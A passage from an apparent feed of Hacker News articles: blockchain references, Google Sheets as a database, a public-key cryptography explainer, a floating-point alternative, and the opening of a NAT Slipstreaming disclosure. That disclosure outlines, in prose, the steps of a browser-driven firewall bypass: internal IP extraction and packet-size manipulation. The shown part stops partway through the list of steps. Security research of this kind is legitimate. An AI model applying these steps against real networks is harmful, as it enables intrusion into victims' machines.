noopener">📃</a></p></li><li><p>Bentov, I. 2017. Cryptocurrencies without Proof of Work. <a href="https://arxiv.org/pdf/1406.5694.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="ethereum">Ethereum</h3><ul><li><p>Sompolinsky, Y., Zohar, A. 2013. Secure High-Rate Transaction Processing in Bitcoin. <a href="https://web.archive.org/web/20150402122229/https://eprint.iacr.org/2013/881.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Eth Wiki. Modified Merkle Patricia Trie Specification. <a href="https://eth.wiki/fundamentals/patricia-tree" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Buterin, V. 2013. Ethereum White Paper: A Next Generation Smart Contract &amp; Decentralized Application Platform. <a href="https://ethereum.org/en/whitepaper/" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Dameron, M. 2019. Beigepaper: An Ethereum Technical Specification. <a href="https://github.com/chronaeon/beigepaper/blob/master/beigepaper.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Wood, G. 2020. Ethereum: A Secure Decentralised Generalised Transaction Ledger. <a href="https://ethereum.github.io/yellowpaper/paper.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Solidity Documentation. <a href="https://buildmedia.readthedocs.org/media/pdf/solidity/develop/solidity.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="scaling">Scaling</h3><ul><li><p>Croman, K. et al. 2016. On Scaling Decentralized Blockchains. <a href="https://www.comp.nus.edu.sg/~prateeks/papers/Bitcoin-scaling.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Kalonde, H. et al. 2018. Arbitrum: Scalable, private smart contracts. <a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-kalodner.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Dang H. et al. 2019. Towards Scaling Blockchain Systems via Sharding. <a href="https://arxiv.org/pdf/1804.00399.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Buterin, V. Serenity Design Rationale. <a href="https://notes.ethereum.org/s/rkhCgQteN" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Buterin, V. et al. 2020. Combining GHOST and Casper. <a href="https://arxiv.org/pdf/2003.03052.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Adler, J., Quintyne-Collins, M. 2020. Building Scalable Decentralized Payment Systems. <a href="https://arxiv.org/pdf/1904.06441.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h3 id="other-blockchains">Other Blockchains</h3><ul><li><p>Namecoin. 2011. Merged mining. <a href="https://en.bitcoin.it/wiki/Merged_mining_specification" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Van Saberhagen, N. 2013. CryptoNote v 2.0 (Annotated by the Monero Team). <a href="https://web.getmonero.org/resources/research-lab/pubs/whitepaper_annotated.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Ben-Sasson, E. et al. 2014. Zerocash: Decentralized Anonymous Payments from Bitcoin. <a href="http://zerocash-project.org/media/pdf/zerocash-extended-20140518.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Poelstra, A. 2016. Mimblewimble. <a href="https://download.wpsoftware.net/bitcoin/wizardry/mimblewimble.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Team Rocket et al. 2019. Scalable and Probabilistic Leaderless BFT Consensus through Metastability. <a href="https://arxiv.org/pdf/1906.08936v1.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li><li><p>Bonneau, J. et al. 2020. Mina: Decentralized Cryptocurrency at Scale. <a href="https://minaprotocol.com/static/pdf/technicalWhitepaper.pdf" target="_blank" rel="noreferrer noopener">📃</a></p></li></ul><h2 id="priority-requests">Priority Requests!</h2><p>Let me know which papers would you like to read first in Twitter. Please reply to this thread:</p><blockquote data-dnt="true"><div lang="en" dir="ltr"><p>1/14</p><p>🔭 𝗧𝗵𝗲 𝗦𝗰𝗶𝗲𝗻𝗰𝗲 𝗼𝗳 𝗕𝗹𝗼𝗰𝗸𝗰𝗵𝗮𝗶𝗻𝘀</p><p>I'm starting my blog with a blog series to celebrate the 12th anniversary of the Bitcoin white paper. 🎂<a href="https://t.co/Bsc5R0FDqX">https://t.co/Bsc5R0FDqX</a></p></div>— Han Tuzun (@hantuzn) <a href="https://twitter.com/hantuzn/status/1322710239653875712?ref_src=twsrc%5Etfw">November 1, 2020</a></blockquote></div></div></div>]]>
            </description>
            <link>https://hantuzun.com/posts/the-science-of-blockchains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956642</guid>
            <pubDate>Sun, 01 Nov 2020 01:40:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Sheets as a Database Service for Web Applications]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24956638">thread link</a>) | @hieunc229
<br/>
October 31, 2020 | https://hieunc.com/posts/vm3TjRrE73Y-google-sheets-as-a-database-service-for-web-applications | <a href="https://web.archive.org/web/*/https://hieunc.com/posts/vm3TjRrE73Y-google-sheets-as-a-database-service-for-web-applications">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="str-vOKpYe5nW" data-connect-field="content"><p>Spreadsheet services like Google Sheets or Airtable have already used by many people, teams, and companies. What makes them more interesting is, they introduce non-tech users to the no-code movement, open doors for interesting possibilities.</p><p>No-code is like Starbuck, a kind of coffee also for people who don’t drink coffee. What great about Starbuck isn’t the taste, but it allows more people to enjoy coffee. In other words, <strong>no-code is a programming language for non-programmers</strong>.</p><p>Recently, I’ve examined using Google Sheet as a database service when integrating to <a href="https://medium.com/r/?url=https%3A%2F%2Finverr.com">Inverr</a> — a no-code builder. It can possibly operate for sites or apps with less than 5M visits/month, with big enough data storage for small apps. Though, it comes with some limitations.</p><p>In this post, I’ll address a few technical issues when using Google Sheets as a database service, its effects, and how to overcome it.</p><h3 id="1-search-is-inconvenient">1. Search is Inconvenient</h3><p>The main functions of the database are store, retrieve, and search for data. While Google Sheets is doing excellent at storing and retrieving data, the searching part in Google Sheets is a bit tricky.</p><p>On many apps, search provides discoverability. For example, when you’re building a movie discovery app, users search a movie by name, filter by a category, or popularity. Without search, the movie app is no different than a movie list.</p><p>To use the searching feature, Google Sheets APIs provide a property called “developerMetadata”. It’s an additional data on each cell, and invisible to Google Sheets users. When searching, it will use these additional data.</p><p>“developerMetadata” has a <a href="https://medium.com/r/?url=https%3A%2F%2Fdevelopers.google.com%2Fsheets%2Fapi%2Fguides%2Fmetadata%23metadata_storage_limits">limit</a> of 30,000 characters for each spreadsheet. It’s too small to do anything great. Though, you can optimize for sentence, paragraph by only store important terms.</p><h3 id="2-quota-and-storagenbsplimits">2. Quota and Storage&nbsp;Limits</h3><p>Google Sheets has a storage limit at 5,000,000 cells (including blank ones), and up to 256 columns per sheet.</p><p>Let’s take an example as a movie discovery app, it needs at least 6 properties (id, title, description, release date, rating, category). As a rough estimation, you can only store up to 5,000,000 / 6 = <strong>~833k movies</strong>. Since there are currently <a href="https://medium.com/r/?url=https%3A%2F%2Fwww.imdb.com%2Fpressroom%2Fstats%2F">555,913 movies</a> released, in theory, it’s still acceptable.</p><p>Another limitation when using Google Sheet APIs is its request quota. Starting at 500 requests per 100 seconds (or 5 requests per second), and start charging when excessed. In many cases, using proper caching techniques will reduce the number of requests to Google Cloud APIs services.</p><h3 id="3-acceptable-performance-on-a-largenbspdataset">3. Acceptable Performance on a Large&nbsp;Dataset</h3><p><img src="https://cdn-images-1.medium.com/max/800/1*HrJxokwIWMsvLqb_4KFB6Q.png" alt=""></p><p><em>Query Performance Google&nbsp;Sheets</em></p><p>This is an unrealistic measure, but to test the limit and get a better overview, I tried getting data from a spreadsheet with a large dataset.</p><p>The above graph demonstrates the performance of retrieving thousands of cells per second from Google Sheets. It took around 2 seconds when getting 100k cells all at once, which 100k / 6 = ~16k movies. This is acceptable performance, and grows as the number of cells grows.</p><h3 id="4-no-schema-and-proper-restriction">4. No Schema and Proper Restriction</h3><p>Google Sheets is like a database with its own presentation. For example, you have a spreadsheet for monthly expenses. It contains a list of expenses, their category. And in the end, it can have a <strong>total expense value</strong> by the sum of all expenses in the month.</p><p>The layout freedom is convenient when using it as a spreadsheet, but a nightmare for a database. Because there is always some kind of fixed layout that the database follows. It allows the database engine to calculate the distance and navigate between rows of data. And no database designed without a layout.</p><p>Besides, unless you decided that no-one will ever touch the spreadsheet, someone might accidentally screw it up by renaming the tab or remove it.</p><hr><p>To conclude, Google Sheets is widely used as a tool. But as a database, it comes with some limitations. With proper caching and optimization, it is safe to use it as a database for webs/apps with &lt; 5.000.000 visits monthly.</p><p>Besides, its search limitation can be a huge bottleneck in many scenarios. You can use “developerMetadata” to enable data lookup. With 30k characters limits, it’s a good practice to store only “meta” data.</p><p><a href="https://medium.com/r/?url=https%3A%2F%2Finverr.com">Try to build a website with Google Sheet, or your own database →</a></p></div></div>]]>
            </description>
            <link>https://hieunc.com/posts/vm3TjRrE73Y-google-sheets-as-a-database-service-for-web-applications</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956638</guid>
            <pubDate>Sun, 01 Nov 2020 01:39:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public-Key Cryptosystems and Digital Signatures]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24956259">thread link</a>) | @keyboardman
<br/>
October 31, 2020 | https://leimao.github.io/blog/Public-Key-Cryptosystem-and-Digital-Signature/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/blog/Public-Key-Cryptosystem-and-Digital-Signature/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Sometimes I would get some interesting questions from my friends about internet security, such as whether it is possible to leak the bank account password when logging to the online bank via an untrusted network, whether it is possible that the message you received from someone via an untrusted network got modified maliciously, and whether it is possible that someone pretends to be you and send messages in your name. My answers to those questions are as long as your computer and cell phone are uncontaminated they are almost impossible thanks to our modern public-key crytosystems and digital signatures.</p>



<p>There are a couple of introductions to the public-key crystosystems and digital signature available online. However, I think most of them are incomplete or hard to understand. In this blog post, I am going to describe the public-key crystosystems and digital signatures using extremely simple math, so that there would be no ambiguity at all.</p>

<h3 id="usages">Usages</h3>

<p>The modern cryptosystems are public-key encryption systems in which everyone has a public-key for encryption and a private key for decryption. The public-key is seen by everyone, but the private is only accessible by the owner. The public-key encryption systems could also generate digital signatures which could be used to verify whether the message you received is unmodified and truly sent from the sender.</p>



<p>RSA (Rivest–Shamir–Adleman) is a typical algorithm for the public-key cryptosystems used by modern computers to encrypt and decrypt messages. However, we are not going to introduce the RSA algorithm in this blog post. Instead, we would describe the public-key cryptosystems and digital signatures at a high level.</p>

<h3 id="essential-features">Essential Features</h3>

<p>Each user has their own encryption and decryption functions, $E$ and $D$, using public-key and private key respectively. We use $M$ to represent the message to be encrypted and sent. There are four features that are essential to a public-key cryptosystem.</p>

<ul>
  <li>Decrypting an encrypted message gives you the original message (Of course!). Specifically,</li>
</ul><p>

\[D(E(M)) = M\]

</p><ul>
  <li>Encrypting a decrypted message gives you the original message (Hmm…). Specifically,</li>
</ul><p>

\[E(D(M)) = M\]

</p><ul>
  <li>
    <p>$E$ and $D$ are easy to compute. This means the encryption and decryption process should be fast.</p>
  </li>
  <li>
    <p>The publicity of $E$ does not compromise the secrecy of $D$. This means you could hardly find a way to decrypt the encrypted message, even if you know how to encrypt the message.</p>
  </li>
</ul>

<p>We would ignore how to satisfy the four features in this blog post.</p>

<h3 id="message-encryption-and-decryption">Message Encryption and Decryption</h3>

<p>Suppose we have two people, Alice and Bob. Both of them are using the same public-key cryptosystems. This means Alice and Bob both have their private keys stored secretly and have their public key published to some authorities. From the authorities, we could find the public keys of Alice and Bob unambiguously. We denote encrypting the message using Alice and Bob’s public keys to be $E_A$ and $E_B$ respectively, and decrypting the message using Alice and Bob’s private keys to be $D_A$ and $D_B$ respectively.</p>



<p>One day, Alice wanted to send a private message $M$ to Bob. Alice found the public key of Bob, encrypted the message $M$ using Bob’s public key. The encrypted message for Bob is denoted as $C$.</p><p>

\[E_B(M) = C\]

</p><p>Once Bob received the encrypted message $C$, he could decrypt $C$ using his private key.</p><p>

\[D_B(C) = D_B(E_B(M)) = M\]

</p><p>Even if the network was compromised and someone intercepted $C$, it is still almost impossible to decrypt $C$ because of that $D_B$ is unknown and the feature “the publicity of $E$ does not compromise the secrecy of $D$” for public-key cryptosystems.</p>



<p>The message content is safe because of the public-key encryption systems. However, it does not provide any assurance about the sender. For example, James could send Bob a message $M^\prime$ which specifically says the message is from Alice, encrypt it using $E_B$, and send it to Bob. If there is no author verification procedure and Bob is not careful enough, Bob might actually think the message is sent from Alice. In some other scenarios, James might have intercepted the encrypted message $C$ sent out from Alice to Bob, prevented the message transmission to Bob, replaced the original message to $M^\prime$ which specifically says the message is from Alice, encrypt it using $E_B$, and send it to Bob. Bob might also be convinced that the message content $M^\prime$ was actually the original message Alice has sent. Specifically,</p><p>

\[E_B(M^\prime) = C^\prime \\
D_B(C^\prime) = D_B(E_B(M^\prime)) = M^\prime\]

</p><p>Digital signatures, derived from the public-key cryptosystems, are designed to solve these authentication problems.</p>

<h3 id="digital-signatures">Digital Signatures</h3>

<p>In addition to the encrypted message $C$ that Alice sent to Bob, Alice would also have to send her digital signature $S$ to Bob. Namely,</p><p>

\[E_B(D_A(M)) = S\]

</p><p>Alice could find $E_B$ using Bob’s public key and $D_A$ using her private key.</p>



<p>Once Bob received both $S$ and $C$, he could decrypt both $S$ and $C$ using his private key and Alice’s public key. Specially,</p><p>

\[D_B(C) = D_B(E_B(M)) = M \\
E_A(D_B(S)) = E_A(D_B(E_B(D_A(M)))) = E_A((D_A(M))) = M\]

</p><p>We found actually the two decrypted messages from $S$ and $C$ are exactly the same. This is expected if the message was sent from Alice and the content of the message was not modified. Let’s further see what will happen if someone pretends to be Alice to send a message to Bob, or the content of the message has been modified.</p>



<p>James, again, wanted to send Bob a message $M^\prime$ which specifically says the message is from Alice, or had intercepted an encrypted message $C$ from Alice, blocked it and created a message $M^\prime$ which specifically says the message is from Alice. To make the message readable by Bob, James encrypted $M^\prime$ using $E_B$, send the encrypted message $C^\prime$ to Bob.</p><p>

\[E_B(M^\prime) = C^\prime\]

</p><p>Because Bob does not accept any message without a signature, James had to make up a signature. However, because James knew nothing about Alice’s private key, he used a decryption function $D_J$ which is different from Alice’s secrete $D_A$. The signature James generated would be</p><p>

\[E_B(D_J(M^\prime)) = S^\prime\]

</p><p>Once Bob received both $S^\prime$ and $C^\prime$, he could decrypt both $S$ and $C$ using his private key and Alice’s public key as usual. Specially,</p><p>

\[D_B(C^\prime) = D_B(E_B(M^\prime)) = M^\prime \\
E_A(D_B(S^\prime)) = E_A(D_B(E_B(D_J(M^\prime)))) = E_A((D_J(M^\prime))) = M^{\prime\prime}\]

</p><p>In this case, Bob would see the two decrypted messages are not the same. Bob would then realize that there is something unusual happened and he should not trust anything about the message.</p>

<h3 id="hacking-the-public-key-cryptosystems">Hacking the Public-Key Cryptosystems</h3>

<p>As long as the four features of the public-key cryptosystems hold, cracking it is almost impossible. If somedayy, when the almighty quantum computer is available, the feature “the publicity of $E$ does not compromise the secrecy of $D$” would be compromised, therefore the modern public-key cryptosystems would no longer be reliable. I may talk about this topic in the future.</p>



<p>There is another way to send fake messages to Bob in name of Alice, without using a quantum computer. If James could somehow crack the account name and password of Alice on the web application, replace the Alice’s public encryption function from $E_A$ to $E_J$, when Bob tried to retrieve Alice’s encryption function, he would get $E_J$ instead of $E_A$. The decryption of signature $S^\prime$ would become $M^\prime$ instead of $M^{\prime\prime}$ then. Concretely,</p><p>

\[E_J(D_B(S^\prime)) = E_J(D_B(E_B(D_J(M^\prime)))) = E_J((D_J(M^\prime))) = M^{\prime}\]

</p><p>In this case the two decrypted messages match. Bob would be convinced that the message is from Alice and it has not been modified.</p>



<p>It should be noted that James was replacing Alice’s public encryption function from $E_A$ to $E_J$, instead of replacing his private decryption function from $D_J$ to $D_A$. In principle, $D_A$ would only be kept on Alice local computer and not anywhere else. Even if James has Alice’s account name and password on the web application, he would not get a copy of $D_A$ unless he specifically hacked Alice’s physical computer.</p>



<p>This reminds us that actually keeping our password safe is the most important.</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="https://sites.math.washington.edu/~morrow/336_09/papers/Yevgeny.pdf">The RSA Algorithm</a></li>
  <li><a href="https://www.youtube.com/watch?v=JR4_RBb8A9Q">What are Digital Signatures and How Do They Work?</a></li>
</ul>

      <hr>
      
    </div></div>]]>
            </description>
            <link>https://leimao.github.io/blog/Public-Key-Cryptosystem-and-Digital-Signature/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956259</guid>
            <pubDate>Sat, 31 Oct 2020 23:58:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Yet another alternative to floating-point numbers]]>
            </title>
            <description>
<![CDATA[
Score 23 | Comments 15 (<a href="https://news.ycombinator.com/item?id=24956184">thread link</a>) | @okaleniuk
<br/>
October 31, 2020 | https://wordsandbuttons.online/yet_another_alternative_to_floating_point_numbers.html | <a href="https://web.archive.org/web/*/https://wordsandbuttons.online/yet_another_alternative_to_floating_point_numbers.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<p>
Floating-point numbers are fine. They are decently designed and well standardized, they provide a good compromise between performance and precision. They work great most of the time. Until the day when they suddenly don't and nobody knows why.
	</p>
	<p>
For me, that day came when I encountered a bug in the Taubin estimator. <a href="https://graphics.stanford.edu/courses/cs468-01-fall/Papers/taubin-smoothing.pdf">Taubin smoothing</a> takes a triangle mesh, a pair of magic numbers called λ and μ, a little time to think, and it makes the input mesh smooth. It also makes sure that the mesh isn't reduced to a perfectly smooth but rather uninteresting sphere or a point.
	</p>
	<p>
The first magic number λ is something between 0 and 1. When it's 0 — nothing happens at all, and when it's 1 — nothing good happens either. It should be somewhere in between. Nobody really knows how to pick this number but an experienced engineer can at least make an educated guess. 
	</p>
	<p>
The second magic number governs shrinkage compensation. It's a negative number slightly greater than λ in its absolute value. Nobody knows how to pick it either but this time even an educated guess is a challenge.
	</p>
	<p>
That's why you need an estimator. Something that picks the μ for you. And we have one. And it was bugged. And I was the one to fix it.
	</p>
	<p>
The first day of the investigation showed that the estimator is in fact entirely correct. The second day of the investigation  showed that the tests covering the bug are correct just as well. The third day of the investigation brought a promising hypothesis that the whole story is just a bad dream and all it takes to solve the mystery is to wake up. The fourth morning killed that hypothesis and left me completely clueless.
	</p>
	<p>
Luckily I have a friend who is smarter than me and he advised to fuzz the input a little and see what happens then. I did. And something happened. The bug didn't go away but the μ changed a lot. Way unproportionally to the small changes in the input. Fascinating!
	</p>
	<p>
We can expect a computation to work with some error. It's fine, we get input data from sensors and they embed some error, to begin with. We print out our finished models, and the printers have some limited precision as well so a small error doesn't upset anyone. It's all good while the error is small. But what if it isn't?
	</p>
	<p>
As it turns out, in my case, a completely correct algorithm had a computational error of about 1. Not 1e-16 or 1e-5 but 1. Just 1. So if you expect your μ to be somewhat close to -0.7, and the estimator says it's 0.3, it is in fact correct. It is still a correct estimation within its error range.
	</p>
	<p>
Correct but entirely useless.
	</p>
	<h2>
Challenge your intuition with a “Guess the Error” game
	</h2>
	<p>
Ok, so it's not the computational error per se that causes trouble but only the unexpected and unpredictable error. Can we predict it though?
	</p>
	<p>
Well, of course, we can. There is a whole field of numerical error analysis for that but let's be honest, most of the time we use our intuition instead. So how good is our intuition exactly?
	</p>
	<p>
I propose a game to find out. Let's take a cubic equation solver. It's a relatively complex computation with a very simple way to validate its precision. We will pick some roots first and then we will generate the cubic equation for these roots. Then we'll make the cubic solver find our roots back through the computation. The difference between the original and the computed value for each root will be our measurable error. This error divided by the original value will be our relative error.
	</p>
	<p>
Here is the exact code for the experiment. It's also <a href="https://github.com/akalenuk/wordsandbuttons/blob/master/exp/rational_bounds/rationale/cubic_solver_example.cpp">available on GitHub</a>.
	</p>
	
	
	
	<p>
Now if we pick our roots as 1, 2, and 3, the equation produced will be:
	</p>
	<p>
(x - 1) (x - 2) (x - 3) = 0
	</p>
	<p>
Expanding the brackets we get this:
	</p>
	<p>
x<sup>3</sup> - 6x<sup>2</sup> + 11x - 6 = 0
	</p>
	<p>
And when we run our solver we get:
	</p>
	<p>
x = 1, x = 2, x = 3
	</p>
	<p>
Well, yes. On the equation this simple there is no error whatsoever. The computation works flawlessly. So let's start making it worse.
	</p>
	<h2>Round 1</h2>
	<p>
The slider below lets you pick an interval in the logarithmic scale. The interval may start at 10<sup>-12</sup> and end at 10<sup>12</sup>. It's impossible to predict the exact error up to a single number so you should just pick an appropriate interval that covers the error<span id="shown_note_1"><u onclick="show('note_1')">*</u>.</span>
	</p>
	<p>
Let's say we have the roots of 0.001, 2, 3 000. So to which interval, in your opinion, the maximum relative error for a cubic solver belongs?
	</p>
	<canvas id="interval_1" width="608" height="84"></canvas>
	
	

	<h2>Round 2</h2>
	<p>
Now let's make our roots even more diverse in magnitude. How about 1e-6, 2, and 3e6?
	</p>
	<p>
Where do you think the error might be?
	</p>
	<canvas id="interval_2" width="608" height="84"></canvas>
	
	

	<h2>Round 3</h2>
	<p>
And what about 1e-9, 2, and 3e9?
	</p>
	<canvas id="interval_3" width="608" height="84"></canvas>
	
	
	<h2>Meet the <span id="index_rational_bounds">rational bounds</span></h2>
	<p>
It's not the error per se that is bad. Error is omnipresent. Every measuring device has its error, every 3D printer and every milling machine has its maximal precision. The error is fine.
	</p>
	<p>
It's only the unpredictability that makes it unpleasant.
	</p>
	<p>
People address errors in multiple ways. In metrology, a measured value is supplemented with its absolute error. You don't say that the temperature outside is 10°, you say it's 10° ± 0.5°. This might seem redundant since this is a small error for the weather outside, but in some other context, this very error might become significant. If you're measuring body temperature, a 1-degree difference is enough to tell a sick person from a perfectly healthy one. You can not afford a whole 1-degree error in this scenario.
	</p>
	<p>
If you have this input error written down, you can pull it through your computation to see if the resulting error is still tolerable. To do that, you need to exchange your measured numbers for intervals. A number with error becomes an interval: 10° ± 0.5° becomes [9.5, 10.5]°.
	</p>
	<p>
You can sum these intervals just as you add numbers:
	</p>
<canvas id="interval_4" width="608" height="84"></canvas>
	<p>
+
	</p>
<canvas id="interval_5" width="608" height="84"></canvas>
	<p>
=
	</p>
<canvas id="interval_6" width="608" height="84"></canvas>
	<p>
You can multiply them as well.
	</p>
<canvas id="interval_7" width="608" height="84"></canvas>
	<p>
×
	</p>
<canvas id="interval_8" width="608" height="84"></canvas>
	<p>
=
	</p>
<canvas id="interval_9" width="608" height="84"></canvas>
	<p>
So with intervals, you can accommodate the input error. You can drag it through the computation and see how it plays with other values with their own error. In the end, you will have your computed value within some interval and the size of this interval will indicate the output error. But what about the error of the computation itself?
	</p>
	<p>
A computational error occurs when we can't store the operation result in the same types we keep our operands in and we're forced to throw some data away. Let's say we have Python-style “unlimited” length integers. This means that if our computation only consists of addition, subtraction, and multiplication, we would never face any computational error.
	</p>
	<p>
Of course, with division, things get a little bit different. E. g. we can't store <nobr>16 ¾</nobr> in integers so we have to truncate it into 16. In this case, the whole fractional part becomes our error.
	</p>
	<p>
We can use pairs of integers to represent rational numbers. This will solve the division issue. However, this type of rational number, while does not accumulate errors, accumulates digits. The more digits it has, the slower the computation goes. At some point, it may simply become impractically slow. Just like with the uncontrollable error, uncontrollable size becomes an issue.
	</p>
	<p>
We want a compromise. Some entity that grows error controllably yet still operates in constant speed. And we can get it, for example, by merging two ideas: intervals and rational numbers together.
	</p>
	<p>
Let's say, we want to write a number as an interval of its tenths. We can do that most intuitively by throwing away all the digits after the first one.
	</p>
	<table><tbody><tr>
	<td></td>
	<td>≤</td>
	<td></td>
	<td>≤</td>
	<td></td>
	</tr></tbody></table>
	<p>
Just like we can do this with decimal fraction, we can do this with any rational number. We can put it between a pair of rational numbers made by finite integers. In this case, every integer is in the range [0, 1, ..., 99].
	</p>
	<table><tbody><tr>
	<td></td>
	<td rowspan="2">≤</td>
	<td></td>
	<td rowspan="2">≤</td>
	<td></td>
	</tr><tr>
	<td></td>
	<td></td>
	<td></td>
	</tr></tbody></table>
	<p>
Ok, this is not entirely true. If the number is greater than 99, then we can't really store it in our tiny rationals but we can say that it's larger than 99 by assigning the 0 divisor to its upper bound. Of course, it's just a dirty hack but let's leave it like that.
	</p>
	<p>
Now if we want to accommodate both input error and computational error, all we have to do is to represent an input interval in its finite rational numbers. A finite rational lower bound of this interval and a finite rational upper bound of the same interval.
	</p>
	<table><tbody><tr>
	<td></td>
	<td rowspan="2">≤</td>
	<td></td>
	<td rowspan="2">≤</td>
	<td></td>
	<td rowspan="2">≤</td>
	<td></td>
	</tr><tr>
	<td></td>
	<td></td>
	<td></td>
	<td></td>
	</tr></tbody></table>
	<p>
This entity — a pair of finite rational bounds, represents a real number along with both its input error and representational error. It also grows computational error explicitly while the size of the entity remains constant.
	</p>
	<p>
The implementation example is <a href="https://github.com/akalenuk/wordsandbuttons/tree/master/exp/rational_bounds/sketch_in_cpp">available on GitHub</a>. Please note that it's just a proof of concept and not the best possible solution in terms of neither error minimization nor speed.
	</p>

	<h2>Conclusion</h2>
	<p>
The computational error may become a problem at the least appropriate moment. Both rational numbers and intervals are well-known alternatives for floating-point numbers when the error becomes an issue.
	</p>
	<p>
Rational bounds, being a chimeric product of both ideas, let you manage both measurement error and computational error in a coherent way without compromising performance all that much.
	</p>


	

	
	</div></div>]]>
            </description>
            <link>https://wordsandbuttons.online/yet_another_alternative_to_floating_point_numbers.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24956184</guid>
            <pubDate>Sat, 31 Oct 2020 23:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NAT Slipstreaming]]>
            </title>
            <description>
<![CDATA[
Score 360 | Comments 99 (<a href="https://news.ycombinator.com/item?id=24955891">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | https://samy.pl/slipstream/ | <a href="https://web.archive.org/web/*/https://samy.pl/slipstream/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><a href="https://samy.pl/slipstream/">NAT Slipstreaming</a> allows an attacker to remotely access any TCP/UDP service bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website.</p><p><em>animation generated with my <a target="_blank" href="https://github.com/samyk/drawio">fork</a> of <a target="_blank" href="https://draw.io/">draw.io</a>, allowing exportable edge context flow &amp; control in animations</em></p><p>NAT Slipstreaming exploits the user's browser in conjunction with the Application Level Gateway (ALG) connection tracking mechanism built into NATs, routers, and firewalls by chaining internal IP extraction via timing attack or WebRTC, automated remote MTU and IP fragmentation discovery, TCP packet size massaging, TURN authentication misuse, precise packet boundary control, and protocol confusion through browser abuse. As it's the NAT or firewall that opens the destination port, this bypasses any browser-based port restrictions.</p><p>This attack takes advantage of arbitrary control of the data portion of some TCP and UDP packets <i>without</i> including HTTP or other headers; the attack performs this new packet injection technique across all major modern (and older) browsers, and is a modernized version to my original <a target="_blank" href="https://samy.pl/natpin/">NAT Pinning technique from 2010</a> (presented at DEFCON 18 + Black Hat 2010). Additionally, new techniques for local IP address discovery are included.</p><p>This attack requires the NAT/firewall to support ALG (Application Level Gateways), which are mandatory for protocols that can use multiple ports (control channel + data channel) such as SIP and H323 (VoIP protocols), FTP, IRC DCC, etc.</p><div>
  <li>victim visits malicious site (or site with malicious advertisement)<!-- eg <a target=_blank href="https://samy.pl/slipstream/server">https://samy.pl/slipstream/server</a>--></li>
<li>internal IP of victim first must be extracted by browser and sent to server

<ul>
<li>internal IP attempted to be extracted via <a target="_blank" href="https://www.w3.org/TR/webrtc/">WebRTC</a> data channel over https</li>
<ul>
<li>some browsers (Chrome) only divulge the local IP via WebRTC over HTTPS but some of our attacks require HTTP so we first redirect to the HTTPS version of the attack software to extract the local IP</li>
<li>we then redirect to the HTTP version with the local IP included in the URL if we were able to obtain it to bypass other cross-origin protection mechanisms (the <code>.local</code> mDNS/Bonjour address presented will not be useful for the attack)</li>
</ul>
<li>if internal IP not divulged by WebRTC (Safari) or no WebRTC (&lt;= IE11), <strong>web-based TCP timing attack performed</strong>

<ul>
<li>hidden <code>img</code> tags to all common gateways (eg <code>192.168.0.1</code>) are loaded in background</li>
<li><code>onerror/onsuccess</code> events attached to <code>img</code> tags</li>
<li>if any TCP RST (oneror) returned by gateway, or SYN + HTTP response (onsuccess), within a few seconds (before TCP timeout triggers onerror), we've detected valid subnet</li>
<li>re-perform timing attack across all IPs on detected subnets (/24), measuring time to onerror/onsuccess firing</li>
<li>fastest response is likely internal IP, though all responses are considered victim internal IP candidates and attacked</li>
</ul></li>
</ul></li>
<li>large TCP beacon sent via hidden form and automatic HTTP POST to attacker "HTTP server" bound to a non-standard port to force TCP segmentation and maximum MTU size discovery of the victim's IP stack
<ul>
<li>attacker TCP server sends <a target="_blank" href="https://tools.ietf.org/html/rfc793#section-3.1">Maximum Segment Size</a> TCP Option to massage victim outbound packet sizes (<a target="_blank" href="https://tools.ietf.org/html/rfc793#section-3.1">RFC 793 x3.1</a>), allowing control of how large browser TCP packets will be</li>
</ul></li>
<li>large UDP beacon sent from browser via WebRTC TURN authentication mechanism to non-standard port to attacker's server to force IP fragmentation with TURN <code>username</code> field stuffed
<ul>
<li>we perform a similar attack as our TCP segmentation, but over UDP as IP fragmentation will occur and provide different values than TCP segmentation</li>
<li>victim MTU size, IP header size, IP packet size, TCP header size, TCP segment sizes detected by server and sent back to victim's browser, used later for packet stuffing</li>
</ul></li>
